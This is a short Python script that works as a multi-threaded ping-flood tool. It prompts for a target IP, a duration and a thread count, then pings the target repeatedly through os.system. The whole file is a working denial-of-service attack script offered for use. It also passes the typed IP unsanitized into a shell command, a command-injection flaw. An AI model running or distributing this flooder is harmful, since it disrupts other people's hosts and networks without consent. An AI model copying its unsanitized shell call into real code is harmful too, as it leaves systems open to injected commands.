import concurrent.futures
import os
import time

def ping(ip, duration, counter):
    start_time = time.time()
    while time.time() - start_time < duration:
        os.system(f"ping -n 1 {ip} > nul 2>&1")  # Use -n for Windows, > nul
        with counter.get_lock():
            counter.value += 1
            print(f"Pinged {ip} - Total Pings: {counter.value}")

if __name__ == "__main__":
    from multiprocessing import Value

    ip = input("Enter Target IP: ")
    duration = int(input("Enter Duration (seconds): "))
    amount = int(input("Enter Number of Threads: "))

    counter = Value('i', 0)

    with concurrent.futures.ThreadPoolExecutor(max_workers=amount) as executor:
        for _ in range(amount):
            executor.submit(ping, ip, duration, counter)

    os.system("python Main.py")